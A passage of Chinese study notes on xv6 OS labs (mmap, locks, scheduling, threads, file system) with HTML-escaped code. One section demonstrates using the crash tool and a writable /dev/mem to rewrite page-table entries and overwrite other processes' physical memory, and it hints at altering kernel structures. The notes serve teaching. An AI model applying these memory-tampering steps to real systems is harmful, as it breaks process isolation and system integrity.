\u0026lt; 0 || argint(3, \u0026amp;flags) \u0026lt; 0 || argfd(4, \u0026amp;fd, \u0026amp;f) \u0026lt; 0); if(goodargs || (!f-\u0026gt;writable \u0026amp;\u0026amp; (prot \u0026amp; PROT_WRITE) \u0026amp;\u0026amp; (flags \u0026amp; MAP_SHARED))) return ret; acquire(\u0026amp;p-\u0026gt;lock); struct entry *vma = allocvma(); if (vma) { int pte_prot = 0; if (prot \u0026amp; PROT_READ) pte_prot |= PTE_R; if (prot \u0026amp; PROT_WRITE) pte_prot |= PTE_W; filedup(f); vma-\u0026gt;va_end = p-\u0026gt;vma_end; // start在小 end在大 mmap回傳的addr是小的!! ret = vma-\u0026gt;va_end-size; vma-\u0026gt;size = size; vma-\u0026gt;f = f; vma-\u0026gt;prot = pte_prot; vma-\u0026gt;flag = flags; p-\u0026gt;vma_end -= size; } release(\u0026amp;p-\u0026gt;lock); return ret; } uint64 do_mummap(uint64 addr, int len) { struct proc* p = myproc(); struct entry *vma = getvma(addr); if (!vma || addr + len \u0026gt; vma-\u0026gt;va_end) { return -1; } //printf(\u0026#34;??: %d start:%p va:%p va_end:%p end:%p\\n\u0026#34;, vma-\u0026gt;size, vma-\u0026gt;va_end-vma-\u0026gt;size, addr, addr+len, vma-\u0026gt;va_end); for (uint64 va=addr,end=addr+len;va \u0026lt; end;va+=PGSIZE) { if (walkaddr(p-\u0026gt;pagetable, va)) { if (vma-\u0026gt;flag \u0026amp; MAP_SHARED) filewrite(vma-\u0026gt;f, va, PGSIZE); uvmunmap(p-\u0026gt;pagetable, va, 1, 1); } } if (addr == vma-\u0026gt;va_end-vma-\u0026gt;size \u0026amp;\u0026amp; addr+len == vma-\u0026gt;va_end) { vma-\u0026gt;size = 0; //fileclose(vma-\u0026gt;f); vma-\u0026gt;f-\u0026gt;ref--; } else { vma-\u0026gt;size -= len; if (addr+len == vma-\u0026gt;va_end) vma-\u0026gt;va_end -= len; } return 0; } uint64 sys_munmap(void) { uint64 addr; int len; if (argaddr(0, \u0026amp;addr) \u0026lt; 0 || argint(1, \u0026amp;len) \u0026lt; 0) return -1; return do_mummap(addr, len); } 在page fault才map與讀檔案\nint do_mmap(uint64 addr) { struct proc* p = myproc(); uint64 base = PGROUNDDOWN(addr); void *mem; if((mem = kalloc()) == 0) printf(\u0026#34;out of pa\\n\u0026#34;); else { struct entry* vma = getvma(addr); if (vma) { memset(mem, 0, PGSIZE); if (mappages(p-\u0026gt;pagetable, base, PGSIZE, (uint64)mem, vma-\u0026gt;prot|PTE_U|PTE_X) \u0026lt; 0) kfree(mem), printf(\u0026#34;map fail\\n\u0026#34;); else { ilock(vma-\u0026gt;f-\u0026gt;ip); int offset = base - (vma-\u0026gt;va_end-vma-\u0026gt;size); readi(vma-\u0026gt;f-\u0026gt;ip, 1, base, offset, PGSIZE); iunlock(vma-\u0026gt;f-\u0026gt;ip); return 0; } } else { //printf(\u0026#34;vma no found\\n\u0026#34;); kfree(mem); } } return -1; } void usertrap(void) { // ... } else if(r_scause() == 13 || r_scause() == 15) { if (do_mmap(r_stval()) \u0026lt; 0) p-\u0026gt;killed = 1; } else { // ... } 剩下就是初始化與在fork時vma用到的file要記得refcnt要遞增\nLinux crash tool 經過前面lab的洗禮，相信大家也對va,pa,pte的關係有深刻的了解 這樣可以來看看，在linux中怎麼改mem\ncrash tool: 可以分析kerneldump看ctx與kernel的struct /dev/mem: 整個mem的視圖，就是ch3第一張圖的所有東西都會在這裡看到 下面借用這裡的內容來看看這兩個怎麼一起用 先預設/dev/mem可以寫，pagetable沒有任何限制\n這裡可以看crash的指令\nvtop: show va的訊息 wr: 改寫 mem set: 把mem view改成該pid的process的view ps: 就是ps 改pte的map 兩個process，兩個page，兩個addr(0x34000000, 0x34004000)\n之後在crash中改pte指到的地方\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int main(int argc, char **argv) { int fd; unsigned long *addr; fd = open(\u0026#34;/dev/mem\u0026#34;, O_RDWR); // 建立一個分頁 P1 映射到保留記憶體 addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x34000000); // 修改 P1 的内容 *addr = 0x1122334455667788; printf(\u0026#34;address at: %p content is: 0x%lx\\n\u0026#34;, addr, addr[0]); // 等待分頁交換 getchar(); printf(\u0026#34;address at: %p content is: 0x%lx\\n\u0026#34;, addr, addr[0]); close(fd); munmap(addr, 4096); return 1; } #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int main(int argc, char **argv) { int fd; unsigned long *addr; fd = open(\u0026#34;/dev/mem\u0026#34;, O_RDWR); // 建立分頁 P2 映射到保留的記憶體 addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0x34004000); // 修改 P2 的内容 *addr = 0x8877665544332211; printf(\u0026#34;address at: %p content is: 0x%lx\\n\u0026#34;, addr, addr[0]); // 等待分頁交換 getchar(); printf(\u0026#34;address at: %p content is: 0x%lx\\n\u0026#34;, addr, addr[0]); close(fd); munmap(addr, 4096); return 1; } 接著要找pte，找對面對到的pa\ncrash\u0026gt; ps | grep master [8/287] 32334 32333 6 ffff93d0ed35c680 IN 0.0 4512 1384 master crash\u0026gt; set 32334 PID: 32334 COMMAND: \u0026#34;master\u0026#34; TASK: ffff93d0ed35c680 [THREAD_INFO: ffff93d0ed35c680] CPU: 6 STATE: TASK_INTERRUPTIBLE crash\u0026gt; vtop 0x7f8f3ba6a000 VIRTUAL PHYSICAL 7f8f3ba6a000 2c0000000 \u0026lt;= va 與 pa PGD: 2ae2f87f8 =\u0026gt; 80000002af219067 PUD: 2af2191e0 =\u0026gt; 2a9d3c067 PMD: 2a9d3cee8 =\u0026gt; 2ac34b067 PTE: 2ac34b350 =\u0026gt; 80000002c0000267 \u0026lt;= pte 與 對到的pa PAGE: 2c0000000 PTE PHYSICAL FLAGS 80000002c0000267 2c0000000 (PRESENT|RW|USER|ACCESSED|DIRTY|NX) VMA START END FLAGS FILE ffff93d0e894e000 7f8f3ba6a000 7f8f3ba6b000 d0444fb /dev/mem crash\u0026gt; wr -64 -p 2ac34b350 80000002c0004267 \u0026lt;= pte 與 對面對到的pa crash\u0026gt; ps | grep slave 32348 32347 1 ffff93d0ed359780 IN 0.0 4512 1416 slave crash\u0026gt; set 32348 PID: 32348 COMMAND: \u0026#34;slave\u0026#34; TASK: ffff93d0ed359780 [THREAD_INFO: ffff93d0ed359780] CPU: 1 STATE: TASK_INTERRUPTIBLE crash\u0026gt; vtop 0x7f269fba3000 VIRTUAL PHYSICAL 7f269fba3000 2c0004000 PGD: 2ae2ca7f0 =\u0026gt; 80000002ac354067 PUD: 2ac3544d0 =\u0026gt; 2b45f6067 PMD: 2b45f67e8 =\u0026gt; 2ac7db067 PTE: 2ac7dbd18 =\u0026gt; 80000002c0004267 PAGE: 2c0004000 PTE PHYSICAL FLAGS 80000002c0004267 2c0004000 (PRESENT|RW|USER|ACCESSED|DIRTY|NX) VMA START END FLAGS FILE ffff93d0eea18820 7f269fba3000 7f269fba4000 d0444fb /dev/mem crash\u0026gt; wr -64 -p 2ac7dbd18 80000002c0000267 改pa的值 先給個程式，印出va(不然無法知道pa)，之後直接改pa的值\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { unsigned char *addr; // 匿名映射一段記憶體空間 addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0); // 修改內容 strcpy(addr, \u0026#34;浙江溫州皮鞋濕\u0026#34;); // 只是範例，所以直接顯示 address 實際操作時需要手工 hack 記憶體位置 printf(\u0026#34;address at: %p content is: %s\\n\u0026#34;, addr, addr); getchar(); printf(\u0026#34;address at: %p content is: %s\\n\u0026#34;, addr, addr); munmap(addr, 4096); return 1; } 用crash找pa\ncrash\u0026gt; ps | grep test 11608 11607 1 ffff93d0ed378000 IN 0.0 4512 1408 test crash\u0026gt; set 11608 PID: 11608 COMMAND: \u0026#34;test\u0026#34; TASK: ffff93d0ed378000 [THREAD_INFO: ffff93d0ed378000] CPU: 1 STATE: TASK_INTERRUPTIBLE crash\u0026gt; vtop 0x7f7d88693000 VIRTUAL PHYSICAL 7f7d88693000 1f83ed000 PGD: 2a73ee7f0 =\u0026gt; 8000000220a30067 PUD: 220a30fb0 =\u0026gt; 2ae1f4067 PMD: 2ae1f4218 =\u0026gt; 2b0c7e067 PTE: 2b0c7e498 =\u0026gt; 80000001f83ed867 PAGE: 1f83ed000 PTE PHYSICAL FLAGS 80000001f83ed867 1f83ed000 (PRESENT|RW|USER|ACCESSED|DIRTY|NX) VMA START END FLAGS FILE ffff93d0ec033450 7f7d88693000 7f7d88694000 80000fb dev/zero PAGE PHYSICAL MAPPING INDEX CNT FLAGS ffffd377c7e0fb40 1f83ed000 ffff93d0f01a9290 0 2 17ffffc0040038 uptodate,dirty,lru,swapbacked 現在我們知道0x1f83ed000就是我們要的位置!! 就改吧 mmap到pa去\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; int main(int argc, char **argv) { int fd; unsigned char *addr; unsigned long off = 0x1f83ed000; fd = open(\u0026#34;/dev/mem\u0026#34;, O_RDWR); addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, off); strcpy(addr, \u0026#34;下雨進水不會胖\u0026#34;); close(fd); munmap(addr, 4096); return 1; } 小結 這裡的例子很簡單，但是很可怕，基本上只要知道pa就什麼都擋不住了 同時如果知道struct的大小與偏移量，基本上就是可以操作任何東西了\n像是在task_struct遊走，改常數等等\u0026hellip; 可以看上面的文章與這裡都有一些使用範例\nHeap Coruption 剛好提到記憶體，可以看看關於記憶體的問題，下面內容主要處自這裡\n在第一次的dump，backtrace沒有印出正確的行號 文中提到懷疑是Heap Coruption的理由是 崩潰是發生在存取非法位址 這個行號所在的程式碼單純到沒辦法找到造成問題的部分在哪 可以猜猜看why 亂序執行 concurrent，但明顯不是 之前在不對的地方沒有停下來 可以試試把array超過length的地方print出來: print的出來!! 如果這是迴圈中出事就還好，但如果出了loop\u0026hellip; 第二次dump用了大招，上heap保護 這與xv6的stack的guard page一樣，出錯直接panic 這樣就可以直接看到對的地方，index出界，在8爆了 不是在5爆? 為了好分配mem，所以會對齊 回頭來看c的type到底是什麼? 一次要跳幾格 char是1 uint64是8 etc 所以c其實就是一直幫忙算這個addr一次跳幾格 出事由下面的cpu噴 linux有辦法這樣做嗎? 定位Memory Corruption的思路 ch6 當我們說鎖保護數據時，我們真正的意思是鎖保護了一些適用於數據的不變式(invariant）集合\n你可以把鎖看成是把並發的臨界區串行化(serializing)的一種工具，使它們同時只運行一個，從而保護 invariant（假設臨界區是獨立的）。\n正確地使用鎖可以保證一次只能有一個 CPU 對關鍵部分的數據結構進行操作，所以當數據結構的 invariant 不成立時，沒有 CPU 會執行數據結構操作\n如果一個穿過內核的代碼路徑必須同時持有多個鎖，那麼所有的代碼路徑以相同的順序獲取這些鎖是很重要的 * 有時鎖的身份並不是事先知道的，也許是因為必須持有一個鎖才能發現接下來要獲取的鎖的身份\nCPU 的 ordering 規則稱為內存模型!! (目前看過最精練的解釋)\n自旋锁 關中斷 atomic cas while looping =\u0026gt; lock mem barrier =\u0026gt; mem barrier 一個中斷處理程序使用了自旋鎖，CPU 決不能在啟用中斷的情況下持有該鎖。 Xv6 比較保守：當一個 CPU 獲取任何鎖時，xv6 總是禁用該 CPU 上的中斷。\nxv6 在 CPU 沒有持有自旋鎖時重新啟用中斷；它必須做一點記錄來應對嵌套的臨界區。\n這個spinlock可以recursive!! 因為有紀錄cpu id所以可以處理這一段\ntrace: spinlock 我們把debug有關的部分skip掉\n// Mutual exclusion lock. struct spinlock { uint locked; // Is the lock held? }; acquire對數字做test_and_set，不成功就一直轉\n這裡要用riscv提供的指令去換，不然被reorder就出事了 因為原本有設定cpuid的部分，導致還需要memory barrier 但這裡就先跳掉 void acquire(struct spinlock *lk) { push_off(); while(__sync_lock_test_and_set(\u0026amp;lk-\u0026gt;locked, 1) != 0) ; } release就是acquire反著做\nvoid release(struct spinlock *lk) { __sync_lock_release(\u0026amp;lk-\u0026gt;locked); pop_off(); } 睡眠锁 擴展自旋锁，多了sleep\n上spinlock 直到拿到鎖之前，一直sleep 處理虛假喚醒 這裡是把sleep多傳一個lock，保證sleep後lock會被釋放 pthread也是，但是叫condition var\ntrace: sleeplock struct sleeplock { uint locked; // Is the lock held? struct spinlock lk; // spinlock protecting this sleep lock }; acquire與release其實很簡單，用spinlock保護locked 如果只有保護locked能用atomic?\n答案是不行，因為還要保護成功sleep\nvoid acquiresleep(struct sleeplock *lk) { acquire(\u0026amp;lk-\u0026gt;lk); while (lk-\u0026gt;locked) { sleep(lk, \u0026amp;lk-\u0026gt;lk); } lk-\u0026gt;locked = 1; release(\u0026amp;lk-\u0026gt;lk); } void releasesleep(struct sleeplock *lk) { acquire(\u0026amp;lk-\u0026gt;lk); lk-\u0026gt;locked = 0; wakeup(lk); release(\u0026amp;lk-\u0026gt;lk); } 為了可以在有lock當狀態下sleep，變成sleep要解上面lock，之後再鎖自己的lock 可以看到這邊lock涵蓋的範圍有overlay\n如果有用過pthread的cond var就會看到一樣的東西!!\nvoid sleep(void *chan, struct spinlock *lk) { struct proc *p = myproc(); if(lk != \u0026amp;p-\u0026gt;lock){ //DOC: sleeplock0 acquire(\u0026amp;p-\u0026gt;lock); //DOC: sleeplock1 release(lk); } // ... // Reacquire original lock. if(lk != \u0026amp;p-\u0026gt;lock){ release(\u0026amp;p-\u0026gt;lock); acquire(lk); } } 用什麼鎖 因為睡眠鎖會使中斷處於啟用狀態，所以不能在中斷處理程序中使用睡眠鎖\n自旋鎖最適合短的臨界區，因為等待它們會浪費 CPU 時間 睡眠鎖對長時間的操作很有效\nLab Lock Memory allocator 把freelist放到各個cpu中\nstruct cpu { // ... struct run *freelist; struct spinlock lock; }; 所以kalloc要從自己的list中找，如果沒有就去偷 kfree就直接塞回自己的list\nvoid* kalloc(void) { // ... push_off(); int i = cpuid(); acquire(\u0026amp;cpus[i].lock); if (!cpus[i].freelist) { r = steal_page(i); } else { r = cpus[i].freelist; cpus[i].freelist = r-\u0026gt;next; } release(\u0026amp;cpus[i].lock); pop_off(); // ... } void kfree(void *pa) { // ... int i = cpuid(); acquire(\u0026amp;cpus[i].lock); r-\u0026gt;next = cpus[i].freelist; cpus[i].freelist = r; release(\u0026amp;cpus[i].lock); pop_off(); } 偷就是走訪其他cpu看有沒有free的\nvoid* steal_page(int i) { // interrupt should be disabled void *ret = 0; for (int j=((i+1)%NCPU); !ret \u0026amp;\u0026amp; j!=i; j=((j+1)%NCPU)) { acquire(\u0026amp;cpus[j].lock); if (cpus[j].freelist) { ret = cpus[j].freelist; cpus[j].freelist = cpus[j].freelist-\u0026gt;next; } release(\u0026amp;cpus[j].lock); } return ret; } Buffer cache 其實可以用前面的想法，把list打散\n#define TBL_SIZE 7 struct entry { struct buf head; struct spinlock lock; }; struct entry tbl[TBL_SIZE]; void insert_buf(struct buf* head, struct buf* b) { b-\u0026gt;next = head-\u0026gt;next, b-\u0026gt;prev = head; head-\u0026gt;next-\u0026gt;prev = b, head-\u0026gt;next = b; } 拿不到就去偷\nbget(uint dev, uint blockno) { struct buf *b; //acquire(\u0026amp;bcache.lock); // Is the block already cached? int i = tbl_index(dev, blockno); acquire(\u0026amp;tbl[i].lock); // check cache for(b = tbl[i].head.next; b != \u0026amp;tbl[i].head; b = b-\u0026gt;next) if(b-\u0026gt;dev == dev \u0026amp;\u0026amp; b-\u0026gt;blockno == blockno){ b-\u0026gt;refcnt++; release(\u0026amp;tbl[i].lock); acquiresleep(\u0026amp;b-\u0026gt;lock); return b; } // steal free buf for (int j=i, cnt=0;cnt \u0026lt; TBL_SIZE;j=((j+1)%TBL_SIZE),cnt++) { if (i != j) acquire(\u0026amp;tbl[j].lock); for(b = tbl[j].head.next; b != \u0026amp;tbl[j].head; b = b-\u0026gt;next){ if(b-\u0026gt;refcnt == 0){ b-\u0026gt;dev = dev; b-\u0026gt;blockno = blockno; b-\u0026gt;valid = 0; b-\u0026gt;refcnt = 1; b-\u0026gt;tbl_index = i; struct buf *prev = b-\u0026gt;prev, *next = b-\u0026gt;next; if (prev) { prev-\u0026gt;next = next; } else { tbl[j].head.next = next; } if (next) { next-\u0026gt;prev = prev; } insert_buf(\u0026amp;tbl[i].head, b); if (i != j) release(\u0026amp;tbl[j].lock); release(\u0026amp;tbl[i].lock); acquiresleep(\u0026amp;b-\u0026gt;lock); return b; } } if (i != j) release(\u0026amp;tbl[j].lock); } release(\u0026amp;tbl[i].lock); panic(\u0026#34;bget: no buffers\u0026#34;); } 剩下的就是把bcache改成用到對的list\nstruct buf { int tbl_index; // ... }; ch7 xv6 的sleep 和 wakeup 機制會進行切換 這會發生在進程等待設備或管道 I/O 等待子進程退出 在 sleep 系統調用中等待\nxv6 週期性地強制切換，以應對長時間的計算進程。\n首先，如何從一個進程切換到另一個進程？ 第二，如何對用戶進程透明的強制切換？ (用定時器中斷來驅動上下文切換) 第三，許多 CPU 可能會在進程間並發切換，需要設計一個鎖來避免競爭。 第四，當進程退出時，必須釋放進程的內存和其他資源，但它自己不能做到這一切，因為它不能釋放自己的內核棧，同時又在使用內核棧。 第五，多核機器的每個內核必須記住它正在執行的進程，這樣系統調用就會修改相應進程的內核狀態。 最後，sleep 和 wakeup 允許一個進程放棄 CPU，並睡眠等待事件，並允許另一個進程喚醒第一個進程。\n需要注意一些競爭可能會使喚醒丟失!!\ncoperative thread: sleep, wakeup, ctx switch, scheduler ctx switch xv6 調度器在每個 CPU 上有一個專門的線程(保存的寄存器和棧)，因為調度器在舊進程的內核棧上執行是不安全的\n棧指針和 pc 被保存和恢復，意味著 CPU 將切換棧和正在執行的代碼\nSwtch(kernel/swtch.S:3)只保存 callee-saved 寄存器，caller-saved 寄存器由調用的 C 代碼保存在堆棧上(如果需要)\n它不保存 pc。 當swtch 返回時，它返回到被恢復的 ra 寄存器所指向的指令，也就是新線程之前調用 swtch的指令。 此外，它還會在新線程的棧上返回。\nscheduler 其實就是在沒有process在跑的時候選一個跑\nmain會call，scheduler 之後scheduler挑一個proc (RR) ctx switch 到ctx switch時還沒release lock!! 對於上下文切換來說，有必要打破這個約定，因為 p-\u0026gt;lock 保護了進程的狀態和 context 字段上的不變式(invariant)，而這些不變式在 swtch 中執行時為 false。 都是與mycpu換ctx!! 所以可以看成mycpu()-\u0026gt;context就是正在跑的cpu的state，也是proc的state(不是RUNNABLE之類的，是執行的狀態) p-\u0026gt;lock?? 可以這樣理解調度代碼結構，它執行一組關於進程的不變式，並且每當這些不變式為False 時，就持有 p-\u0026gt;lock。\n一個不變式是，\n如果一個進程正在運行，定時器中斷的 yield 必須能夠安全地切換進程； 這意味著 CPU 寄存器必須持有進程的寄存器值（即 swtch 沒有將它們移到上下文中） 並且 c-\u0026gt;proc 必須指向該進程。 另一個不變式是， 如果一個進程是RUNNABLE 的，那麼對於一個空閒的 CPU 調度器來說，運行它必須是安全的 這意味著 （1）p-\u0026gt;context 必須擁有進程的寄存器（i.e., 它們實際上並不在真實的寄存器中） （2）沒有 CPU 在進程的內核棧上執行 （3）也沒有 CPU 的 c-\u0026gt;proc 指向進程 請注意，當 p-\u0026gt;lock被持有時，這些屬性往往不為真。 維護上述不變式的原因：xv6 經常在一個線程中獲取 p-\u0026gt;lock，然後在另一個線程中釋放\n直到成功轉移state之前都要hold lock\nmycpu and myproc Xv6 為每個 CPU 維護了一個 cpu 結構體(kernel/proc.h:22)，它記錄了當前在該 CPU 上 運行的進程(如果有的話)，為 CPU 的調度線程保存的寄存器，以及管理中斷禁用所需的嵌套 自旋鎖的計數。\nXv6 確保每個 CPU 的 hartid 在內核中被存儲在該 CPU 的 tp 寄存器中\nUsertrapret 將 tp 寄存器保存在 trampoline 頁中，因為用戶進程可能會修改 tp 寄存器\n當從用戶空間進入內核時，uservec 會恢復保存的 tp(kernel/trampoline.S:70)。編譯器保證永遠不使用 tp 寄存器。\n如果 RISC-V 允許 xv6 直接讀取當前的 hartid 會更方便\ncpuid 和 mycpu 的返回值很容易錯： 如果定時器中斷，導致線程讓出 CPU，然後轉移到不同的 CPU 上，之前返回的值將不再正確。 為了避免這個問題，xv6 要求調用者禁用中斷，只有在使用完返回的 cpu 結構後才啟用中斷\nmyproc(kernel/proc.c:68)函數返回當前 CPU 上運行的進程的 proc 指針。 myproc 禁用中斷，調用 mycpu，從 cpu 中獲取當前進程指針(c-\u0026gt;proc)，然後啟用中斷。\nmyproc不用lock防嗎?? 當下指到的proc是對的\nSleep 為了確保進入sleep前的state改變不會被打斷 (eg: semaphore的P)\nsleep會先hold proc的lock，才去\nrelease 前一個lock 改proc狀態 p-\u0026gt;chan = chan; p-\u0026gt;state = SLEEPING; sched 這邊會看到一個有趣的事，與scheduler一樣，p-\u0026gt;lock沒有release!!\nwakeup 把所有聽在同一個lock(semaphore)的proc的state設定成runnable\n虛假喚醒 wakeup會把所有proc，叫醒，但只有一個proc可以拿到lock\n所以對其他proc而言，這是虛假喚醒!!\nexit \u0026amp; wait exit: 把file close，把proc設定成ZOMBIE，sched wait: 掃child proc，看有沒有ZOMBIE，有就設定成UNUSED；沒有就sleep\n父進程和子進程的 wait 和 exit，以及 exit 和 exit 之間可能出現競爭和死鎖的情況\n此 xv6 的所有鎖都必須遵守相同的鎖順序（父進程的鎖，然後是子進程的鎖），以避免死鎖\npreemptive thread time interrupt時做sched\nvoid usertrap(void) { // ... // give up the CPU if this is a timer interrupt. if(which_dev == 2) yield(); } trace: trapframe \u0026amp; context 看回來這張圖 sched都是在kernel mode發生，所以不用換pagetable\nsched是換手，也就是我已經做了差不多了，所以會主動call函數，之後只要回來我這邊就好， 但是換回來函數的執行環境(callee-save)會壞掉，所以要存； 用於計算用的參數就，沒有用(做了差不多了，或是說已經存在stack上了(會call函數c會處理))，就不用管\ntrap是中斷，所以之後要在原本的地方跑(還沒做完)，因此要保留原本的pc，不然沒辦法接回去； 同時要保留caller-save，trap可以看成call函數，但沒有c的幫忙，所以這要自己存； 剩下是ctx switch，所以callee-save也要存\ntrace: exit \u0026amp; wait exit:\n把opend file關一關 把parent設定成init 把自己state設定成ZOMBIE wait\n掃過整個proc，找符合下面兩個條件的proc parent是caller的proc state是ZOMBIE 找到就 acquire child的lock (wait!!) 拉proc的return值(xstate) freeproc 沒找到 state不是ZOMBIE parent sleep 沒有proc認caller做parent 報錯 這裡就可以回答一個經典問題，為什麼要有ZOMBIE? 因為把proc回收分成\n關file: exit free mem: wait 而在wait可以拿到proc的return值(所以不能free mem) 但我們需要一個方式表示proc準備好被回收，所以有ZOMBIE\n但為什麼叫ZOMBIE? 這我真的不懂，不能叫EXITED嗎?\nLab Multithreading ph 練手用\npthread_mutex_t table_locks[NBUCKET]; static void insert(int key, int value, struct entry **p, struct entry *n) { // ... // is the key already present? struct entry *e = 0; pthread_mutex_lock(table_locks+i); for (e = table[i]; e != 0; e = e-\u0026gt;next) { // ... insert(key, value, \u0026amp;table[i], table[i]); } pthread_mutex_unlock(table_locks+i); } barrier 這個就有趣了\n一開始會想只要一個出去把counter設成0就好，但這樣while的部分就會出事，可能有人出不來\n這樣我們挑最後一個去reset計數器，但這樣也會有問題，如果說最後一個一直被hang住，之後中間有跑比較快的進來，這樣就不是barrier\n所以鎖要保護兩個條件\n進來時要確認上一輪的不在這裡了 人數到了就能release，最後一個要去reset計數器 static void barrier() { static int no_one_here = 1, in_room = 0; pthread_mutex_lock(\u0026amp;bstate.barrier_mutex); while (!no_one_here) pthread_cond_wait(\u0026amp;bstate.barrier_cond, \u0026amp;bstate.barrier_mutex); pthread_cond_broadcast(\u0026amp;bstate.barrier_cond); bstate.nthread++, in_room++; while (bstate.nthread != nthread) pthread_cond_wait(\u0026amp;bstate.barrier_cond, \u0026amp;bstate.barrier_mutex); if (in_room-- == nthread) no_one_here = 0, bstate.round++; if (in_room == 0) no_one_here = 1, bstate.nthread = 0; pthread_cond_broadcast(\u0026amp;bstate.barrier_cond); pthread_mutex_unlock(\u0026amp;bstate.barrier_mutex); } uthread 這題就去抄context與swtch就好\n但重點是，\n要怎麼到thread的function去? trap是改pc，因為我們不會再回來trap中 但thread可以多次來回，所以需要一個自動回到對的位置的機制，ra\nthread的記憶體要放在哪? 回想當初init怎麼做，讓之後的c可以跑? 從stack0放一個PGSIZE，指到sp void thread_create(void (*func)()) { // ... t-\u0026gt;ctx.ra = (uint64)func; // HERE t-\u0026gt;ctx.sp = (uint64)t-\u0026gt;stack + STACK_SIZE-1; } ch8 磁盤層在 virtio 磁盤上讀寫塊\n緩存層(bio.c)緩存磁盤塊，並同步訪問它們，確保一個塊只能同時被內核中的一個進程訪問\nbuffer 緩存是一個由 buffer 組成的雙端鍊錶 bget根據devid、sector找buffer bread/bwrite讀寫buffer brelse釋放sleep lock bread拿鎖 日誌層(log.c)允許上層通過事務更新多個磁盤塊，並確保在崩潰時，磁盤塊是原子更新的（即全部更新或不更新）\n日誌由一個 header 塊組成，後面是一連串的更新塊副本（日誌塊）。 header 塊包含一個扇區號數組， 每個扇區號都對應一個日誌塊，header 還包含日誌塊的數量 日誌系統可以將多個系統調用的寫操作累積到一個事務中 一次提交可能涉及多個完整系統調用的寫入 為了避免一個系統調用被分裂到不同的事務中，只有在沒有文件系統相關的系統調用正在進行時，日誌系統才會提交 Xv6 在磁盤上劃出固定的空間來存放日誌。在一個事務中，系統調用所寫的塊總數必須 適應這個空間的大小 系統調用寫入的日誌大小必須小於日誌空間的大小 Xv6 的 write 系統調用將大的寫操作分解成多個小的寫操作，以適應在日誌空間的大小 unlink 不會引起問題，因為 xv6 文件系統只使用一個位圖塊 日誌系統只會在確定了系統調用的寫操作可以適應剩餘日誌空間之後，才會開始執行該系統調用 inode 層(fs.c)將一個文件都表示為一個 inode，每個文件包含一個唯一的 i-number 和一些存放文件數據的塊\nballoc 申請一個新的磁盤塊: iterate bitmap bfree 釋放一個塊: clear flag on block 磁盤上的inode 文件的大小和數據塊號的列表 磁盤上的 inode 被放置磁盤的一個連續區域 每一個 inode 的大小都是一樣的 所以，給定一個數字 n，很容易找到磁盤上的第 n 個 inode dinode定義了磁盤上的 inode 包含一個 size 和一個塊號數組 開始的 NDIRECT 個數據塊放置在數組中的前NDIRECT 個條目中，這些塊被稱為直接塊 接下來的 NINDIRECT 個數據塊並沒有放置在inode 中，而是被存放在叫做間接塊的數據塊中 Bmap 返回 inode ip 的第 bn 個數據塊的磁盤塊號。如果 ip 沒有第 bn 個的數據塊，bmap 就會分配一個 (mmap!!) mem中的inode 了磁盤上 inode 的副本以及內核中需要的其他信息 結構體 inode (kernel/file.h:17)是磁盤 dinode 的拷貝 ref 字段為指向 inode 的指針的數量，如果引用數量減少到零，內核就會從內存中丟棄這個 inode iget 和 iput 函數引用和釋放 inode，並修改引用計數 四種鎖 icache.lock 保證了一個 inode 在緩 存只有一個副本，以及緩存 inode 的 ref 字段計數正確 每個內存中的 inode 都有一個包含 sleep-lock 的鎖字段，它保證了可以獨占訪問 inode 的其他字段（如文件長度）以及 inode 的文件或目錄內容塊的 一個 inode 的 ref 如果大於 0，則會使系統將該 inode 保留在緩存 中，而不會重用該 inode 每個 inode 都包含一個 nlink 字段(在磁盤上，緩存時會復 製到內存中)，該字段統計鏈接該 inode 的目錄項的數量；如果一個 inode 的鏈接數大於零， xv6 不會釋放它 目錄層(fs.c)將實現了一種特殊的 inode，被稱為目錄，其包含一個目錄項序列，每個目錄項由文件名稱和 i-number 組成\n函數 dirlookup 在一個目錄中搜索一個帶有給定名稱的條目 函數 dirlink 會在當前目錄 dp 中創建一個新的目錄項 查找路徑名會對每一個節點調用一次 dirlookup Namex首先確定路徑解析從哪裡開始 如果路徑以斜線開頭，則從根目錄開始解析 否則，從當前目錄開始解析。 然後它使用 skipelem 來遍歷路徑中的每個元素 file(file.c)\n系統中所有打開的文件都保存在一個全局文件表中，即 ftable 文件表的功能有: 分配文件(filealloc) 創建重複引用(fileup) 釋放引用(fileclose) 讀寫數據(fileeread和filewrite)。 superblock， 它包含了文件系統的元數據（以塊為單位的文件系統大小、數據塊的數量、inode 的數量和日誌中的塊數）\n位圖塊(bitmap)，記錄哪些數據塊在使用\nballoc與kalloc與malloc的差別 kalloc: 直接丟一個page malloc: 從現有的mem拉一段va出來，如果沒空間了就sbrk加大 * sbrk: growproc -\u0026gt; uvmalloc -\u0026gt; kalloc -\u0026gt; mappages * mappages: 把從kalloc拿到的page與加到pagetable balloc: 與kalloc很像，就是直接丟一個block出來 * 但要處理log!! * 去trace誰是空的 * mem用list(或AVL) * disk用bitmap\ntrace: how to read/write a file fileread readi bread拿buf，bmap算偏移(在hdd上的addr) copyout filewrite begin_op writei bread拿buf，bmap算偏移(在hdd上的addr) copyin log_write 記錄到log end_op commit write_log 寫buf到disk write_head commit log Lab File system big file 就是在block再放一個table，之後再多做一次\nstatic uint bmap(struct inode *ip, uint bn) { uint addr, *a; struct buf *bp; if(bn \u0026lt; NDIRECT){ if((addr = ip-\u0026gt;addrs[bn]) == 0) ip-\u0026gt;addrs[bn] = addr = 